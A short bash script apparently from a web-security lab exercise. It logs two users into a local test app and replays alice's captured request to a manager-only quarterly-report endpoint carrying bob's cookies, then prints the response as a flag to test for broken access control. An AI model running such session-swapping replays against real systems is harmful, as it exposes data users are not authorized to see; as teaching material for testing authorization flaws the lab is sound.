#!/usr/bin/env bash
# Lab 08 — alice's request, bob's cookies. One flag does it: `--as`.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:9080}"
. "$(dirname "$0")/../lib/h5i.sh"
ALICE="lab08-alice-$$"; BOB="lab08-bob-$$"
trap '"$H5I" browser close --session "$ALICE" >/dev/null 2>&1;
      "$H5I" browser close --session "$BOB" >/dev/null 2>&1' EXIT

login() {  # login SESSION USER
    open_lab "$1" "$URL/"
    send "$1" "$REQ0" --create --set method=POST --set path=/login \
        --set header.Content-Type=application/json --set "json.user=$2" >/dev/null
}
login "$ALICE" alice
login "$BOB" bob

# Alice's captured page request, aimed at the manager-only report and sent with
# bob's jar. `--as` drops alice's own cookies and sends bob's, which is exactly
# the question: does the endpoint check the caller, or only the URL? The
# exchange is recorded in bob's session, so read the body off the reply itself.
"$H5I" websec replay "$(first "$ALICE")" --session "$ALICE" --create \
    --set path=/api/reports/quarterly --as "$BOB" --json |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["response"]["body_preview"])' | flag
